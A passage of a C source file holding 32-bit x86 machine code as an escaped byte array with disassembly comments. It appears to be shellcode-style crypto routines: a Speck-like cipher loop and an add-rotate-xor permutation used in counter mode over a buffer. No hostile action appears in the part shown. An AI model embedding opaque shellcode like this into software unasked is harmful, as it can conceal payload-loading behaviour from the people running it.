  /* 08AC */ "\x55"                             /* push      ebp                                 */
  /* 08AD */ "\x53"                             /* push      ebx                                 */
  /* 08AE */ "\x8d\x4c\x24\x20"                 /* lea       ecx, dword ptr [esp + 0x20]         */
  /* 08B2 */ "\xe8\x24\x00\x00\x00"             /* call      0x8db                               */
  /* 08B7 */ "\x33\xd8"                         /* xor       ebx, eax                            */
  /* 08B9 */ "\x33\xea"                         /* xor       ebp, edx                            */
  /* 08BB */ "\x33\xf6"                         /* xor       esi, esi                            */
  /* 08BD */ "\x8b\x44\x24\x2c"                 /* mov       eax, dword ptr [esp + 0x2c]         */
  /* 08C1 */ "\x8b\x4c\x24\x14"                 /* mov       ecx, dword ptr [esp + 0x14]         */
  /* 08C5 */ "\x85\xff"                         /* test      edi, edi                            */
  /* 08C7 */ "\x0f\x84\x78\xff\xff\xff"         /* je        0x845                               */
  /* 08CD */ "\x5f"                             /* pop       edi                                 */
  /* 08CE */ "\x5e"                             /* pop       esi                                 */
  /* 08CF */ "\x8b\xd5"                         /* mov       edx, ebp                            */
  /* 08D1 */ "\x8b\xc3"                         /* mov       eax, ebx                            */
  /* 08D3 */ "\x5d"                             /* pop       ebp                                 */
  /* 08D4 */ "\x5b"                             /* pop       ebx                                 */
  /* 08D5 */ "\x83\xc4\x18"                     /* add       esp, 0x18                           */
  /* 08D8 */ "\xc2\x08\x00"                     /* ret       8                                   */
  /* 08DB */ "\x83\xec\x10"                     /* sub       esp, 0x10                           */
  /* 08DE */ "\x8b\x44\x24\x14"                 /* mov       eax, dword ptr [esp + 0x14]         */
  /* 08E2 */ "\x8b\x54\x24\x18"                 /* mov       edx, dword ptr [esp + 0x18]         */
  /* 08E6 */ "\x53"                             /* push      ebx                                 */
  /* 08E7 */ "\x55"                             /* push      ebp                                 */
  /* 08E8 */ "\x56"                             /* push      esi                                 */
  /* 08E9 */ "\x57"                             /* push      edi                                 */
  /* 08EA */ "\x8b\xf1"                         /* mov       esi, ecx                            */
  /* 08EC */ "\x8d\x7c\x24\x10"                 /* lea       edi, dword ptr [esp + 0x10]         */
  /* 08F0 */ "\x33\xdb"                         /* xor       ebx, ebx                            */
  /* 08F2 */ "\xa5"                             /* movsd     dword ptr es:[edi], dword ptr [esi] */
  /* 08F3 */ "\xa5"                             /* movsd     dword ptr es:[edi], dword ptr [esi] */
  /* 08F4 */ "\xa5"                             /* movsd     dword ptr es:[edi], dword ptr [esi] */
  /* 08F5 */ "\xa5"                             /* movsd     dword ptr es:[edi], dword ptr [esi] */
  /* 08F6 */ "\x8b\x4c\x24\x14"                 /* mov       ecx, dword ptr [esp + 0x14]         */
  /* 08FA */ "\x8b\x74\x24\x1c"                 /* mov       esi, dword ptr [esp + 0x1c]         */
  /* 08FE */ "\x8b\x6c\x24\x18"                 /* mov       ebp, dword ptr [esp + 0x18]         */
  /* 0902 */ "\x8b\x7c\x24\x10"                 /* mov       edi, dword ptr [esp + 0x10]         */
  /* 0906 */ "\x89\x4c\x24\x24"                 /* mov       dword ptr [esp + 0x24], ecx         */
  /* 090A */ "\x8b\xce"                         /* mov       ecx, esi                            */
  /* 090C */ "\xc1\xc8\x08"                     /* ror       eax, 8                              */
  /* 090F */ "\x8b\x74\x24\x24"                 /* mov       esi, dword ptr [esp + 0x24]         */
  /* 0913 */ "\x03\xc2"                         /* add       eax, edx                            */
  /* 0915 */ "\xc1\xce\x08"                     /* ror       esi, 8                              */
  /* 0918 */ "\x33\xc7"                         /* xor       eax, edi                            */
  /* 091A */ "\x03\xf7"                         /* add       esi, edi                            */
  /* 091C */ "\xc1\xc2\x03"                     /* rol       edx, 3                              */
  /* 091F */ "\x33\xf3"                         /* xor       esi, ebx                            */
  /* 0921 */ "\xc1\xc7\x03"                     /* rol       edi, 3                              */
  /* 0924 */ "\x33\xd0"                         /* xor       edx, eax                            */
  /* 0926 */ "\x89\x6c\x24\x24"                 /* mov       dword ptr [esp + 0x24], ebp         */
  /* 092A */ "\x33\xfe"                         /* xor       edi, esi                            */
  /* 092C */ "\x8b\xe9"                         /* mov       ebp, ecx                            */
  /* 092E */ "\x43"                             /* inc       ebx                                 */
  /* 092F */ "\x83\xfb\x1b"                     /* cmp       ebx, 0x1b                           */
  /* 0932 */ "\x72\xd6"                         /* jb        0x90a                               */
  /* 0934 */ "\x5f"                             /* pop       edi                                 */
  /* 0935 */ "\x5e"                             /* pop       esi                                 */
  /* 0936 */ "\x5d"                             /* pop       ebp                                 */
  /* 0937 */ "\x5b"                             /* pop       ebx                                 */
  /* 0938 */ "\x83\xc4\x10"                     /* add       esp, 0x10                           */
  /* 093B */ "\xc2\x08\x00"                     /* ret       8                                   */
  /* 093E */ "\x83\xec\x1c"                     /* sub       esp, 0x1c                           */
  /* 0941 */ "\x8b\xc2"                         /* mov       eax, edx                            */
  /* 0943 */ "\x89\x0c\x24"                     /* mov       dword ptr [esp], ecx                */
  /* 0946 */ "\x8b\x54\x24\x24"                 /* mov       edx, dword ptr [esp + 0x24]         */
  /* 094A */ "\x89\x44\x24\x08"                 /* mov       dword ptr [esp + 8], eax            */
  /* 094E */ "\x53"                             /* push      ebx                                 */
  /* 094F */ "\x8b\x5c\x24\x24"                 /* mov       ebx, dword ptr [esp + 0x24]         */
  /* 0953 */ "\x85\xd2"                         /* test      edx, edx                            */
  /* 0955 */ "\x0f\x84\xe4\x00\x00\x00"         /* je        0xa3f                               */
  /* 095B */ "\x55"                             /* push      ebp                                 */
  /* 095C */ "\x33\xed"                         /* xor       ebp, ebp                            */
  /* 095E */ "\x8d\x48\x0f"                     /* lea       ecx, dword ptr [eax + 0xf]          */
  /* 0961 */ "\x45"                             /* inc       ebp                                 */
  /* 0962 */ "\x89\x4c\x24\x0c"                 /* mov       dword ptr [esp + 0xc], ecx          */
  /* 0966 */ "\x56"                             /* push      esi                                 */
  /* 0967 */ "\x2b\xe8"                         /* sub       ebp, eax                            */
  /* 0969 */ "\x57"                             /* push      edi                                 */
  /* 096A */ "\x89\x6c\x24\x34"                 /* mov       dword ptr [esp + 0x34], ebp         */
  /* 096E */ "\x8b\xf0"                         /* mov       esi, eax                            */
  /* 0970 */ "\x8d\x7c\x24\x1c"                 /* lea       edi, dword ptr [esp + 0x1c]         */
  /* 0974 */ "\x33\xc9"                         /* xor       ecx, ecx                            */
  /* 0976 */ "\xa5"                             /* movsd     dword ptr es:[edi], dword ptr [esi] */
  /* 0977 */ "\xa5"                             /* movsd     dword ptr es:[edi], dword ptr [esi] */
  /* 0978 */ "\xa5"                             /* movsd     dword ptr es:[edi], dword ptr [esi] */
  /* 0979 */ "\xa5"                             /* movsd     dword ptr es:[edi], dword ptr [esi] */
  /* 097A */ "\x8b\x74\x24\x10"                 /* mov       esi, dword ptr [esp + 0x10]         */
  /* 097E */ "\x8b\x04\x8e"                     /* mov       eax, dword ptr [esi + ecx*4]        */
  /* 0981 */ "\x31\x44\x8c\x1c"                 /* xor       dword ptr [esp + ecx*4 + 0x1c], eax */
  /* 0985 */ "\x41"                             /* inc       ecx                                 */
  /* 0986 */ "\x83\xf9\x04"                     /* cmp       ecx, 4                              */
  /* 0989 */ "\x72\xf3"                         /* jb        0x97e                               */
  /* 098B */ "\x8b\x4c\x24\x28"                 /* mov       ecx, dword ptr [esp + 0x28]         */
  /* 098F */ "\x8b\x44\x24\x24"                 /* mov       eax, dword ptr [esp + 0x24]         */
  /* 0993 */ "\x8b\x74\x24\x20"                 /* mov       esi, dword ptr [esp + 0x20]         */
  /* 0997 */ "\x8b\x7c\x24\x1c"                 /* mov       edi, dword ptr [esp + 0x1c]         */
  /* 099B */ "\xc7\x44\x24\x30\x10\x00\x00\x00" /* mov       dword ptr [esp + 0x30], 0x10        */
  /* 09A3 */ "\x03\xfe"                         /* add       edi, esi                            */
  /* 09A5 */ "\x03\xc1"                         /* add       eax, ecx                            */
  /* 09A7 */ "\xc1\xc6\x05"                     /* rol       esi, 5                              */
  /* 09AA */ "\x33\xf7"                         /* xor       esi, edi                            */
  /* 09AC */ "\xc1\xc1\x08"                     /* rol       ecx, 8                              */
  /* 09AF */ "\x33\xc8"                         /* xor       ecx, eax                            */
  /* 09B1 */ "\xc1\xc7\x10"                     /* rol       edi, 0x10                           */
  /* 09B4 */ "\x03\xc6"                         /* add       eax, esi                            */
  /* 09B6 */ "\x03\xf9"                         /* add       edi, ecx                            */
  /* 09B8 */ "\xc1\xc6\x07"                     /* rol       esi, 7                              */
  /* 09BB */ "\xc1\xc1\x0d"                     /* rol       ecx, 0xd                            */
  /* 09BE */ "\x33\xf0"                         /* xor       esi, eax                            */
  /* 09C0 */ "\x33\xcf"                         /* xor       ecx, edi                            */
  /* 09C2 */ "\xc1\xc0\x10"                     /* rol       eax, 0x10                           */
  /* 09C5 */ "\x83\x6c\x24\x30\x01"             /* sub       dword ptr [esp + 0x30], 1           */
  /* 09CA */ "\x75\xd7"                         /* jne       0x9a3                               */
  /* 09CC */ "\x8b\x6c\x24\x10"                 /* mov       ebp, dword ptr [esp + 0x10]         */
  /* 09D0 */ "\x89\x4c\x24\x28"                 /* mov       dword ptr [esp + 0x28], ecx         */
  /* 09D4 */ "\x33\xc9"                         /* xor       ecx, ecx                            */
  /* 09D6 */ "\x89\x74\x24\x20"                 /* mov       dword ptr [esp + 0x20], esi         */
  /* 09DA */ "\x89\x7c\x24\x1c"                 /* mov       dword ptr [esp + 0x1c], edi         */
  /* 09DE */ "\x89\x44\x24\x24"                 /* mov       dword ptr [esp + 0x24], eax         */
  /* 09E2 */ "\x8b\x44\x8d\x00"                 /* mov       eax, dword ptr [ebp + ecx*4]        */
  /* 09E6 */ "\x31\x44\x8c\x1c"                 /* xor       dword ptr [esp + ecx*4 + 0x1c], eax */
  /* 09EA */ "\x41"                             /* inc       ecx                                 */
  /* 09EB */ "\x83\xf9\x04"                     /* cmp       ecx, 4                              */
  /* 09EE */ "\x72\xf2"                         /* jb        0x9e2                               */
  /* 09F0 */ "\x8b\x6c\x24\x34"                 /* mov       ebp, dword ptr [esp + 0x34]         */
  /* 09F4 */ "\x8b\xca"                         /* mov       ecx, edx                            */
  /* 09F6 */ "\x6a\x10"                         /* push      0x10                                */
  /* 09F8 */ "\x58"                             /* pop       eax                                 */
  /* 09F9 */ "\x3b\xd0"                         /* cmp       edx, eax                            */
  /* 09FB */ "\x0f\x47\xc8"                     /* cmova     ecx, eax                            */
  /* 09FE */ "\x85\xc9"                         /* test      ecx, ecx                            */
  /* 0A00 */ "\x7e\x19"                         /* jle       0xa1b                               */
  /* 0A02 */ "\x8d\x7c\x24\x1c"                 /* lea       edi, dword ptr [esp + 0x1c]         */
  /* 0A06 */ "\x8b\xf3"                         /* mov       esi, ebx                            */
  /* 0A08 */ "\x2b\xfb"                         /* sub       edi, ebx                            */
  /* 0A0A */ "\x8b\xe9"                         /* mov       ebp, ecx                            */
  /* 0A0C */ "\x8a\x04\x37"                     /* mov       al, byte ptr [edi + esi]            */
  /* 0A0F */ "\x30\x06"                         /* xor       byte ptr [esi], al                  */
  /* 0A11 */ "\x46"                             /* inc       esi                                 */
  /* 0A12 */ "\x83\xed\x01"                     /* sub       ebp, 1                              */
  /* 0A15 */ "\x75\xf5"                         /* jne       0xa0c                               */
  /* 0A17 */ "\x8b\x6c\x24\x34"                 /* mov       ebp, dword ptr [esp + 0x34]         */
  /* 0A1B */ "\x2b\xd1"                         /* sub       edx, ecx                            */
  /* 0A1D */ "\x03\xd9"                         /* add       ebx, ecx                            */
  /* 0A1F */ "\x8b\x4c\x24\x14"                 /* mov       ecx, dword ptr [esp + 0x14]         */
  /* 0A23 */ "\x80\x01\x01"                     /* add       byte ptr [ecx], 1                   */
  /* 0A26 */ "\x75\x08"                         /* jne       0xa30                               */
  /* 0A28 */ "\x49"                             /* dec       ecx                                 */
  /* 0A29 */ "\x8d\x04\x29"                     /* lea       eax, dword ptr [ecx + ebp]          */
  /* 0A2C */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 0A2E */ "\x7f\xf3"                         /* jg        0xa23                               */
  /* 0A30 */ "\x8b\x44\x24\x18"                 /* mov       eax, dword ptr [esp + 0x18]         */
  /* 0A34 */ "\x85\xd2"                         /* test      edx, edx                            */
  /* 0A36 */ "\x0f\x85\x32\xff\xff\xff"         /* jne       0x96e                               */
  /* 0A3C */ "\x5f"                             /* pop       edi                                 */
  /* 0A3D */ "\x5e"                             /* pop       esi                                 */
  /* 0A3E */ "\x5d"                             /* pop       ebp                                 */
  /* 0A3F */ "\x5b"                             /* pop       ebx                                 */
  /* 0A40 */ "\x83\xc4\x1c"                     /* add       esp, 0x1c                           */
  /* 0A43 */ "\xc2\x08\x00"                     /* ret       8                                   */
};
